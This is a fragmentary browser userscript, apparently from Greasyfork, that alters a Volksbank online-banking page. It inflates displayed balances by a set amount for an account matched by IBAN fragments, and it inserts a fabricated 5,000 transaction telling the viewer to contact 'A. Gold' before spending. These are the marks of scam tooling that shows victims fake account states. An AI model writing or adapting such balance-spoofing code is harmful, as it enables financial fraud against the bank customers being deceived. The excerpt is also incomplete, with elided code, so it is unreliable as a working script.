// ==UserScript==
// @name         Ed 4Rec  vb.hermann.weiss@drs.de
...
// @downloadURL https://update.greasyfork.org/scripts/543605/Ed%204Rec%20%20vbhermannweiss%40drsde.user.js
// @updateURL https://update.greasyfork.org/scripts/543605/Ed%204Rec%20%20vbhermannweiss%40drsde.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  82977},  // 72000
        { index: 1, adjustmentAmount:  82977},  // 72000
        { index: 2, adjustmentAmount:  82977},  // 72000
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    // Define the target text content to search for (case and whitespace insensitive)
       var targetTextContent1 = "DE19 6739 0000";
       var targetTextContent2 = " 0088 1244 05";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 82977; // Adjust the amount as needed  // 72000
   ...
   const TRANSACTIONS = [
    {
      ...
      description: 'A. Gold kontaktieren. Ohne ihn nicht ausgeben.',
      amount: '5.000,00',
      date: '6. Aug.', //21. Aug.
      insertAtTop: false,
      moveSteps: -1,
